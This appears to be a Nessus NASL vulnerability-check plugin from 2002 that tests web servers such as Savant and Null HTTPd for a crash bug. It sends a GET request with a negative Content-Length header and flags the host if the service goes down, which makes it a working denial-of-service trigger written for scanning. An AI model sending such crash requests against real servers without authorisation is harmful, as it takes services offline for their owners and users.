#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
########################
# References:
########################
#
# Date: Fri, 13 Sep 2002 19:55:05 +0000
# From "Auriemma Luigi" <aluigi@pivx.com>
# To: bugtraq@securityfocus.com
# Subject: Savant 3.1 multiple vulnerabilities
#
# See also:
# Date:  Sun, 22 Sep 2002 23:19:48 -0000
# From: "Bert Vanmanshoven" <sacrine@netric.org>
# To: bugtraq@securityfocus.com
# Subject: remote exploitable heap overflow in Null HTTPd 0.5.0
# 
########################
#
# Vulnerables:
# Null HTTPD 0.5.0
#

if(description)
{
 script_id(11174);
 script_version("$Revision: 1.6 $");
 
 name["english"] = "HTTP negative Content-Length DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
We could crash the Savant web server by sending an invalid
GET HTTP request with a negative Content-Length field.

A cracker may exploit this flaw to disable your service or
even execute arbitrary code on your system.

Risk factor : High

Solution : Upgrade your web server";

 script_description(english:desc["english"]);
 
 summary["english"] = "Savant web server crashes if Content-Length is negative";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

#

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if (! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

# Savant attack
req = string("GET / HTTP/1.0\r\nContent-Length: -1\r\n\r\n");
send(socket:soc, data: req);
r = http_recv(socket: soc);
http_close_socket(soc);

#
if(http_is_dead(port: port))
{
  security_hole(port);
}
